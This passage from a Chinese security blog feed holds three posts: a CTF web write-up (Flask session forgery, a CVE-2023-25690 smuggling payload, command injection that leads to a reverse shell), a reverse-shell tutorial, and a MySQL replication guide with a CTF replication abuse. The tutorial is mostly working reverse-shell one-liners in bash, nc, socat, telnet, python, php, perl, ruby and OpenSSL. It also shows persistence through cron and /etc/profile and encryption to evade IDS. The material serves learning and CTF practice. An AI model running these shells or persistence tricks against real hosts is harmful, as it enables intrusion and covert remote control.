class=\"line\">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;d58a3e83c73f903728231612f76290dfc46bf8b4ffa32c0c824e0cb6a54c459891ea2fc13e9cfbef830b8becebbd152e9b0f5039ff3a09f94be96dac53dec926&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot; -s &#x27;th3f1askisfunny&#x27;</span><br></pre></td></tr></table></figure>\n<p>将得到的新 session 改变一下得 flag<br>\n<img data-src=\"https://s2.loli.net/2023/06/23/wOxmQsfUvelYBhz.png\" alt=\"屏幕截图 2023-06-23 153546.png\"></p>\n<h2 id=\"2flaskjwthard\"><a class=\"markdownIt-Anchor\" href=\"#2flaskjwthard\">#</a> 2.flask?jwt?(hard)</h2>\n<p>这题把 key 藏起来了，注册登录后看原代码提示 /wor 路由，访问给了登录时间，<mark> 回到登录这里把 session 随便删除一点就能看到 debug 模式回显 302, 对回显的 session 进行 base64 解码发现是进入的提示语句</mark>，于是在 /wor 路由把 session 也随便删点，可以看到 key</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.secret_key = &#x27;hardgam3_C0u1d_u_f1ndM3????&#x27;;</span><br></pre></td></tr></table></figure>\n<p>之后的做法和第一题一样伪造 session 就行了</p>\n<h2 id=\"3信息收集\"><a class=\"markdownIt-Anchor\" href=\"#3信息收集\">#</a> 3. 信息收集</h2>\n<p>收集到 index.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>   <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]))&#123;       <span class=\"keyword\">echo</span><span class=\"title function_ invoke__\"> file_get_contents</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]);   &#125;   <span class=\"keyword\">else</span>&#123;    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);   &#125;   <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>dirsearch 扫到 index.php, 此时是一个任意文件读取点，通过题目提示信息收集和回显的 <code>Server: Apache/2.4.55 (Unix)</code> <br>\n 找到了<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTIzNDU=\"> CVE-2023-25690</span><br>\n 读取 <code>/usr/local/apache2/conf/httpd.conf</code> ，得到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RewriteEngine on RewriteRule &quot;^/nssctf/(.*)&quot; &quot;http://backend-server:8080/index.php?id=$1&quot; [P] ProxyPassReverse &quot;/nssctf/&quot; &quot;http://backend-server:8080/&quot;</span><br></pre></td></tr></table></figure>\n<p>再修改姿势：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/nssctf/abc%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/flag.txt</span><br></pre></td></tr></table></figure>\n<h2 id=\"4ez_factors\"><a class=\"markdownIt-Anchor\" href=\"#4ez_factors\">#</a> 4.ez_factors</h2>\n<p>点击 Tool 直接跳转 factors/114514<br>\n 此时页面也有 114514，试试命令执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/factors/114514|echo 666</span><br><span class=\"line\">输出了666</span><br><span class=\"line\">直接反弹shell,这里</span><br><span class=\"line\">/factors/114514|bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span><br><span class=\"line\">和</span><br><span class=\"line\">/factors/114514|bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class=\"line\">都会失败</span><br></pre></td></tr></table></figure>\n<p>用 base64 加密执行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/factors/114514|echo [这里是反弹shellbase64加密后的内容]|base64 -d|bash</span><br></pre></td></tr></table></figure>\n<p>直接 cat /flag</p>\n<h2 id=\"5myweb\"><a class=\"markdownIt-Anchor\" href=\"#5myweb\">#</a> 5.MyWeb</h2>\n<p>源码：<br>\n<img data-src=\"https://s2.loli.net/2023/06/23/n61TJxSUbLIyFRq.png\" alt=\"屏幕截图 2023-06-23 192202.png\"><br>\n 题目将 <code>]</code>  替换成 <code>, $value]</code> <br>\n 猜测 json 文件的结构是：<br>\n <code>[1,2,3,4,...]</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">假设它的结构是[1,2,3]</span><br><span class=\"line\">比如我们输入一个];666</span><br><span class=\"line\">结构变成：</span><br><span class=\"line\">[1,2,3, ];666]</span><br><span class=\"line\">构造payload闭合[]:</span><br><span class=\"line\"></span><br><span class=\"line\">];%0aecho `cat /flag`;%0a[</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?mode=save&amp;&amp;value=];%0aecho `cat /flag`;%0a[</span><br><span class=\"line\"></span><br><span class=\"line\">?mode=read</span><br></pre></td></tr></table></figure>\n<h2 id=\"6timetrcer\"><a class=\"markdownIt-Anchor\" href=\"#6timetrcer\">#</a> 6.TimeTrcer</h2>\n<p>有点难，后面看</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/21/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/",
            "url": "https://hq185187.github.io/2023/06/21/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/",
            "title": "反弹shell学习",
            "date_published": "2023-06-21T13:44:24.210Z",
            "content_html": "<h3 id=\"什么是反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#什么是反弹shell\">#</a> 什么是反弹 shell</h3>\n<p>reverse shell, 就是控制端监听在某 TCP/UDP 端口，被控端请求到该控制端端口，并将祺命令行的输入输出转到控制端</p>\n<h3 id=\"什么时候用\"><a class=\"markdownIt-Anchor\" href=\"#什么时候用\">#</a> 什么时候用？</h3>\n<p>通常用于被控端防火墙受限，权限不足，端口被占用等情形<br>\n假设我们攻击了一台机器，打开了该机器的一个端口，我们可以用自己的机器去连接目标机器，这种叫正向连接，远程桌面，web 服务，ssh，telnet 等等<br>\n但是以下情况：</p>\n<ol>\n<li>客户机中了你的马，但是在局域网内</li>\n<li>它的 ip 会动态改变，不能持续控制</li>\n<li>防火墙限制，对方只能发送请求，不能接收请求<br>\n此时只能反弹 shell，就是攻击者指定服务器，受害者主机主动连接攻击者的服务端程序</li>\n</ol>\n<p>环境：<br>\n192.168.81.122（kali 攻击机）<br>\n192.168.81.113  ubuntu)</p>\n<h3 id=\"netcat反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#netcat反弹shell\">#</a> netcat 反弹 shell</h3>\n<p>Linux 默认带 netcat 但是为了安全考虑把反弹 shell 的 - e 给删了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class=\"line\">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class=\"line\">./configure</span><br><span class=\"line\">make &amp;&amp; make install</span><br><span class=\"line\">make clean</span><br></pre></td></tr></table></figure>\n<p>攻击机开启监听：<br>\nnetcat -lvnp 23333<br>\n 目标机主动连接：<br>\nnetcat  192.168.81.122 23333 -e /bin/bash<br>\n<img data-src=\"https://s2.loli.net/2023/06/21/xYqT8Eb9t1OXUkZ.png\" alt=\"屏幕截图 2023-06-21 183357.png\"></p>\n<h3 id=\"利用bash反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#利用bash反弹shell\">#</a> 利用 bash 反弹 shell</h3>\n<p>常用:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class=\"line\"></span><br><span class=\"line\">bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>\n<p>解析:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i 产生一个bash交互环境</span><br><span class=\"line\">&gt;&amp;    将联合符号前面的内容与后面相结合，然后一起重定向给后者。</span><br><span class=\"line\">/dev/tcp/ip/port  让目标主机与攻击机ip的port端口建立一个tcp连接</span><br><span class=\"line\">0&gt;&amp;1  将标准输入与输出的内容相结合,然后重定向到前面标准输出的内容</span><br></pre></td></tr></table></figure>\n<p>实操:<br>\nkali:<br>\nnc -lvnp 23333<br>\nubuntu:<br>\nbash -i &gt;&amp; /dev/tcp/192.168.81.122/23333 0&gt;&amp;1</p>\n<p><img data-src=\"https://s2.loli.net/2023/06/21/Pog29TSt4VZ5zbM.png\" alt=\"屏幕截图 2023-06-21 185633.png\"></p>\n<h3 id=\"curl配合bash反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#curl配合bash反弹shell\">#</a> Curl 配合 Bash 反弹 shell</h3>\n<p>在 kali 的 www 目录下创建一个 index.php 或者 index.html</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.81.122/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>Ubuntu:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl 192.168.81.122|bash</span><br></pre></td></tr></table></figure>\n<h3 id=\"反弹shell写进定时任务\"><a class=\"markdownIt-Anchor\" href=\"#反弹shell写进定时任务\">#</a> 反弹 shell 写进定时任务</h3>\n<p>假设当前用户名为 root,centos 主机写进 /var/spool/cron/root,Ubuntu/Debian 主机写进 /var/spool/cron/crontabs/root 中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br><span class=\"line\"></span><br><span class=\"line\">#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</span><br></pre></td></tr></table></figure>\n<p>反弹 shell 命令写进 /etc/profile 文件<br>\n /etc/profile 文件的内容会在用户打开 bash 窗口的时候执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1 &amp;</span><br><span class=\"line\"># 最后面那个&amp;为的是防止管理员无法输入命令</span><br></pre></td></tr></table></figure>\n<p>当目标主机管理员远程连接该主机时，就会成功执行 shell 命令</p>\n<h3 id=\"利用socat反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#利用socat反弹shell\">#</a> 利用 Socat 反弹 shell</h3>\n<p>Socat 功能与 netcat 类似，据说是 netcat 的加强版<br>\n使用:<br>\nkali</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">socat TCP-LISTEN:2333 -</span><br><span class=\"line\">或者</span><br><span class=\"line\">nc -lvnp 2333</span><br></pre></td></tr></table></figure>\n<p>ubuntu<br>\n 安装:apt install socat</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">socat tcp-connect:192.168.81.122:2333 exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>\n<p>结果:<br>\n<img data-src=\"https://s2.loli.net/2023/06/21/NscbIgO2WjiSGMU.png\" alt=\"屏幕截图 2023-06-21 202214.png\"></p>\n<p><img data-src=\"https://s2.loli.net/2023/06/21/y2zbgodxYUOIHfC.png\" alt=\"屏幕截图 2023-06-21 202241.png\"></p>\n<h3 id=\"利用telnet反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#利用telnet反弹shell\">#</a> 利用 Telnet 反弹 shell</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvnp 2333(kali)</span><br><span class=\"line\"></span><br><span class=\"line\">mknod a p; telnet 192.168.81.122 2333 0&lt;a | /bin/bash 1&gt;a</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://s2.loli.net/2023/06/21/qXZ5NnMIYGamDUA.png\" alt=\"屏幕截图 2023-06-21 202723.png\"><br>\n<img data-src=\"https://s2.loli.net/2023/06/21/n1tvjUQyO2lBwz9.png\" alt=\"屏幕截图 2023-06-21 202732.png\"></p>\n<h3 id=\"各种脚本执行反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#各种脚本执行反弹shell\">#</a> 各种脚本执行反弹 shell</h3>\n<h4 id=\"python脚本反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#python脚本反弹shell\">#</a> python 脚本反弹 shell</h4>\n<p>当目标主机上有 python 环境时，可以用 python 来反弹 shell<br>\n 攻击机:   nc -lvnp 2333<br>\n 目标机主动连接攻击机:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.81.122&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>\n<h4 id=\"php脚本反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#php脚本反弹shell\">#</a> php 脚本反弹 shell</h4>\n<p>目标机主动连接:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r &#x27;$sock=fsockopen(&quot;192.168.81.122&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>\n<h4 id=\"perl脚本反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#perl脚本反弹shell\">#</a> Perl 脚本反弹 shell</h4>\n<p>目标机:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">perl -e &#x27;use Socket;$i=&quot;192.168.81.122&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>\n<h4 id=\"ruby脚本反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#ruby脚本反弹shell\">#</a> Ruby 脚本反弹 shell</h4>\n<p>目标机:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;192.168.81.122&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br><span class=\"line\">或</span><br><span class=\"line\">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;192.168.81.122&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>\n<h4 id=\"metasploit生产反弹shell的一句话\"><a class=\"markdownIt-Anchor\" href=\"#metasploit生产反弹shell的一句话\">#</a> Metasploit 生产反弹 shell 的一句话</h4>\n<p>当我们忘记前面的语句时可以用 metasploit 来生成<br>\n <code>msfvenom -l payloads | grep 'cmd/unix/reverse'</code></p>\n<p>比如我们生产一个 python 的:</p>\n<p><code>msfvenom -p cmd/unix/reverse_python LHOST=192.168.81.122 LPORT=2333 -f raw</code></p>\n<h3 id=\"反弹shell后获取模拟终端\"><a class=\"markdownIt-Anchor\" href=\"#反弹shell后获取模拟终端\">#</a> 反弹 shell 后获取模拟终端</h3>\n<p>此时获得的 shell 不是一个标准的虚拟终端环境，交互性非常差，vim 和 sudo 这种操作都做不了，此时我们可以借助 python 的 pty 库来获取一个标准的虚拟终端环境.</p>\n<p>在获取的 shell 里输入:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"openssl反弹加密shell\"><a class=\"markdownIt-Anchor\" href=\"#openssl反弹加密shell\">#</a> OpenSSL 反弹加密 shell</h3>\n<p>上文的反弹 shell 方法的所有的流量都是<mark>明文传输的</mark>，这些通过 shell 传输的流量都能被管理员直接抓取和理解，若目标主机有网络防御检测系统 (IDS,IPS 等), 会把我们的通信内容进行告警和阻止，因此我们需要对通信的内容进行安全通信，避免窃听，同时确认另一端连接着的身份</p>\n<h4 id=\"openssl简历\"><a class=\"markdownIt-Anchor\" href=\"#openssl简历\">#</a> OpenSSL 简历</h4>\n<p>它时一个开发源代码的软件包库，应用程序可以使用这个包来进行安全通信，避免窃听，同时确定另一端连接者的身份<br>\n使用前需要先生产自签名证书:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure>\n<h4 id=\"使用openssl反弹加密shell\"><a class=\"markdownIt-Anchor\" href=\"#使用openssl反弹加密shell\">#</a> 使用 OpenSSL 反弹加密 shell</h4>\n<p>攻击机:<br>\n 首先需要利用上一步生成的自签名证书</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl s_server -quiet -key key.pem -cert cert.pem -port 2333</span><br></pre></td></tr></table></figure>\n<p>此时的 Open SSL 在攻击机的 2333 端口启动了一个 SSL/TLS server<br>\n 目标机:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.81.122:2333 &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure>\n<p>结果:<br>\n<img data-src=\"https://s2.loli.net/2023/06/21/uj6WzPMqKcikZFh.png\" alt=\"屏幕截图 2023-06-21 214152.png\"></p>\n<p><img data-src=\"https://s2.loli.net/2023/06/21/kwKvQHPf372FuGy.png\" alt=\"屏幕截图 2023-06-21 214142.png\"></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/",
            "url": "https://hq185187.github.io/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/",
            "title": "Mysql主从复制",
            "date_published": "2023-06-21T03:09:09.169Z",
            "content_html": "<h2 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理</h2>\n<p>简单说就是主服务器上执行的语句，从服务器也执行了相同的语句，主服务器的操作在从服务器上产生了相同的效果</p>\n<p>过程：</p>\n<ul>\n<li>master（主数据库）将用户对数据库的更新操作以二进制格式保存进 BinaryLog 日志文件中</li>\n<li>slave (从数据库) 的 I/O 进程读取主数据库的二进制日志文件</li>\n<li>slave 将接收到的日志内容添加到 relay-kog，从数据库的 SQL 进程检测新的日志内容解析并执行</li>\n</ul>\n<p><img data-src=\"https://img-blog.csdnimg.cn/20201102143527123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNzg2Mjg1,size_16,color_FFFFFF,t_70#pic_center\" alt=\"图片\"></p>\n<h2 id=\"配置\"><a class=\"markdownIt-Anchor\" href=\"#配置\">#</a> 配置</h2>\n<p>master：192.168.81.122(kali)<br>\nslave：192.168.81.113(ubuntu)</p>\n<h3 id=\"master配置\"><a class=\"markdownIt-Anchor\" href=\"#master配置\">#</a> Master 配置：</h3>\n<p>命令行进入 MySQL:<br>\n <code> mysql -u root -p</code> <br>\n 接着输入密码，然后创建用户：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//root和root是从服务器器(slave)的数据库用户名和密码</span><br><span class=\"line\">GRANT REPLICATION SLAVE ON *.* to &#x27;root&#x27;@&#x27;192.168.81.113&#x27; identified by &#x27;root&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//刷新系统权限表的配置</span><br><span class=\"line\">flush privileges;</span><br></pre></td></tr></table></figure>\n<p>找到 mysql 的配置文件 /etc/my.conf, 增加以下配置</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#开启binlog</span><br><span class=\"line\">log-bin=mysql-bin</span><br><span class=\"line\">server-id=1</span><br><span class=\"line\">#需要同步的数据库,如果不配置则同步所以数据库</span><br><span class=\"line\">binlog-do-db=mysql_test</span><br><span class=\"line\">#binlog日志保留的天数</span><br><span class=\"line\">expire-logs-days=10</span><br></pre></td></tr></table></figure>\n<p>配置完成后重启 mysql:<br>\nservice mysql restart<br>\n 查看当前 binlog 日志的信息<br>\n <code>show master status\\G</code></p>\n<p>mysql-bin.000002</p>\n<h3 id=\"slave配置\"><a class=\"markdownIt-Anchor\" href=\"#slave配置\">#</a> slave 配置</h3>\n<p>找到 /etc/my.cnf 配置文件，增加以下配置:<br>\n <code>server-id=2</code> <br>\n 接着用命令行登录到 mysql 服务器:<br>\n <code>mysql -u root -p</code> <br>\n 进入 MySQL 后输入以下命令:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CHANGE MASTER TO </span><br><span class=\"line\">MASTER_HOST=&#x27;192.168.81.122&#x27;,//主机IP</span><br><span class=\"line\">MASTER_USER=&#x27;root&#x27;,//之前创建的用户账号</span><br><span class=\"line\">MASTER_PASSWORD=&#x27;root&#x27;,//之前创建的用户密码</span><br><span class=\"line\">MASTER_LOG_FILE=&#x27;mysql-bin.000002&#x27;,//master主机的binlog日志名称</span><br><span class=\"line\">MASTER_LOG_POS=862,//binlog日志偏移量</span><br><span class=\"line\">master_port=3306;//端口</span><br></pre></td></tr></table></figure>\n<p>启动 slave 服务:<br>\n <code>start slave;</code> <br>\n 查看是否启动成功:<br>\n <code>show slave status\\G</code></p>\n<h2 id=\"测试主从复制\"><a class=\"markdownIt-Anchor\" href=\"#测试主从复制\">#</a> 测试主从复制</h2>\n<p>在 maser 主机执行:</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CREATE TABLE `tb_commodity_info` (</span><br><span class=\"line\">  `id` varchar(32) NOT NULL,</span><br><span class=\"line\">  `commodity_name` varchar(512) DEFAULT NULL COMMENT &#x27;商品名称&#x27;,</span><br><span class=\"line\">  `commodity_price` varchar(36) DEFAULT &#x27;0&#x27; COMMENT &#x27;商品价格&#x27;,</span><br><span class=\"line\">  `number` int(10) DEFAULT &#x27;0&#x27; COMMENT &#x27;商品数量&#x27;,</span><br><span class=\"line\">  `description` varchar(2048) DEFAULT &#x27;&#x27; COMMENT &#x27;商品描述&#x27;,</span><br><span class=\"line\">  PRIMARY KEY (`id`)</span><br><span class=\"line\">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT=&#x27;商品信息表&#x27;;</span><br></pre></td></tr></table></figure>\n<p>此时看从数据库的结构</p>\n<h2 id=\"例题2023安洵杯-confronting-robots\"><a class=\"markdownIt-Anchor\" href=\"#例题2023安洵杯-confronting-robots\">#</a> 例题：2023 安洵杯 Confronting robots</h2>\n<p>前面都能用 sqlmap 扫出来直接到最后一步主从复制<br>\n查看数据库版本：<br>\nselect version();<br>\n 在自己 vps 上起一个相同版本的 mariadb，修改默认配置文件 vim /etc/mysql/my.cnf 允许远程访问并启用二进制日志<br>\n server-id = 1 log_bin = /var/log/mysql/mariadb-bin<br>\nservice mysql restart<br>\n 自己的 vps 作为主，题目环境作为从<br>\n主服务器执行<br>\n CREATE USER ‘atest’@’%’ IDENTIFIED BY ‘testtest’;<br>\ngrant replication slave on . to ‘atest’@’%’;<br>\nflush privileges; 使用 select database (); show tables; desc game; 等查询命令将从服务器上的数据库结构一比一复刻到<br>\n主服务器上 CREATE DATABASE IF NOT EXISTS game_data;<br>\nuse game_data<br>\nCREATE TABLE IF NOT EXISTS game ( round int(20) , choice varchar(256) ) ;<br>\n 在主服务器 mysql 中执行 show master status; 记录下来 File 和 Position mysql-bin.000001 1376<br>\n 在从服务器 (题目环境) 命令框中输入<br>\n CHANGE MASTER TO MASTER_HOST=‘主服务器 ip’, MASTER_USER=‘atest’,<br>\nMASTER_PASSWORD=‘testtest’, MASTER_LOG_FILE=‘mariadb-bin.000001 (记录的值)’,MASTER_LOG_POS=1365 (记录的值);<br>\nstart slave;<br>\nshow slave status;<br>\n 显示这个表示成功连接上<br>\n主服务器中执行<br>\n INSERT INTO game (round , choice) VALUES (‘1’, ‘R’), (‘2’, ‘R’),(‘3’, ‘R’), (‘4’, ‘R’),(‘5’, ‘R’), (‘6’, ‘R’),(‘7’,‘R’), (‘8’, ‘R’),(‘9’, ‘R’), (‘10’, ‘R’);</p>\n<p>在开始挑战处输入对应的答案得到 flag</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/08/%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "https://hq185187.github.io/2023/06/08/%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "原生类反序列化学习",
            "date_published": "2023-06-08T15:01:57.675Z",
